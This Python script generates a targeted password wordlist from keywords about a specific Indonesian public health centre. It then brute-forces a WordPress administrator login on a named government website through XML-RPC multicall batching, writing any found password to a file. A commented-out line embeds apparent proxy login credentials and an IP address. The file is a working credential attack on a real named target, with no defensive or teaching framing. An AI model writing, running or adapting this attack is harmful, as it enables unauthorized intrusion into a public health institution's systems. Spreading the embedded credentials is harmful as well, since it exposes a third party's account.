
import requests
import sys
import glob

# ==================================
# 1. 10.000+ WORDLIST GENERATOR
# ==================================
keywords = [
    "puskesjaten", "puskesjaten1", "jaten", "puskesjaten1", "jaten",
    "puskes", "puskesmas", "pustu", "pustujaten", "pusjaten",
    "karanganyar", "kra", "karanganyarkab", "dinkes", "dinas",
    "kesehatan", "sehat", "puskbj1", "pkmjaten", "pkm",
    "admin", "operator", "bidan", "dokter", "perawat", "apoteker", "gawatdarurat"
]
modifiers = ["01", "1", "123", "2024", "2025", "2026", "2020", "2021", "2022", "2023", "!"]
passwords = set()

def variants(word):
    return [word, word.upper(), word.capitalize()]

def leet(word):
    mapping = str.maketrans("aioesbg", "4103586")
    return word.translate(mapping)

for k in keywords:
    for v in variants(k):
        passwords.add(v)
        for m in modifiers:
            passwords.add(f"{v}{m}")
            passwords.add(f"{v}@{m}")
            passwords.add(f"{v}#{m}")
            passwords.add(f"{v}.{m}")
            passwords.add(f"{v}_{m}")
            passwords.add(f"{v}-{m}")
            passwords.add(f"{m}{v}")

import itertools
combo_keywords = [k for k in keywords if len(k) > 3]
for c in itertools.permutations(combo_keywords, 2):
    w1, w2 = c
    combined_c = f"{w1.capitalize()}{w2.capitalize()}"
    combined_l = f"{w1}{w2}"
    combined_u = f"{w1.upper()}{w2.upper()}"
    for base in [combined_c, combined_l, combined_u]:
        passwords.add(base)
        for m in ["1", "123", "2024", "2025", "!"]:
            passwords.add(f"{base}{m}")

passwords.update([
    "PuskesmasJaten1!", "Puskesmas@2025", "Karanganyar#1",
    "JatenSehat123", "Welcome123", "Password123"
])
password_list = sorted(list(passwords), key=len)
print(f"[*] Generated {len(password_list)} targeted passwords.")

# ==================================
# 2. XML-RPC BRUTE FORCER
# ==================================
url = "http://puskesjaten1.karanganyarkab.go.id/xmlrpc.php"
username = "puskesjaten1"
# Proxy configuration - uncomment if needed, currently disabled for speed test without proxy first
# proxies = {"http": "http://oyyvimta:3olvpyzbkfhq@64.137.96.74:6641"} 
proxies = None 

print(f"[*] Attack Target: {url}")
print(f"[*] Username: {username}")
print(f"[*] Using Proxy: {proxies}")

step = 500
for i in range(0, len(password_list), step):
    batch = password_list[i:i+step]
    
    # Construct massive XML payload
    calls_xml = ""
    for p in batch:
        calls_xml += f"""
        <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
        <value><string>{username}</string></value>
        <value><string>{p}</string></value>
        </data></array></value></member>
        </struct></value>"""
    
    payload = f"""<?xml version="1.0"?>
    <methodCall>
    <methodName>system.multicall</methodName>
    <params><param><value><array><data>{calls_xml}</data></array></value></param></params>
    </methodCall>"""
    
    try:
        r = requests.post(url, data=payload, proxies=proxies, timeout=30, 
                         headers={"User-Agent": "Mozilla/5.0", "Content-Type": "text/xml"})
        
        if "isAdmin" in r.text or "struct" in r.text and "faultCode" not in r.text: # Check for success structure
            # Narrow down
            print(f"[!] POTENTIAL HIT in batch {i}-{i+step}!")
            for p in batch:
                single_payload = f"""<?xml version="1.0"?>
                <methodCall><methodName>wp.getUsersBlogs</methodName>
                <params><param><value>{username}</value></param><param><value>{p}</value></param></params>
                </methodCall>"""
                r2 = requests.post(url, data=single_payload, proxies=proxies, timeout=10)
                if "isAdmin" in r2.text:
                    print(f"\n[+] PASSWORD FOUND: {p}")
                    with open("FOUND_PASSWORD.txt", "w") as f: f.write(p)
                    sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        pass
        
    if i % 2000 == 0:
        print(f"[*] Progress: {i}/{len(password_list)}")

print("[-] Finished. No password found.")
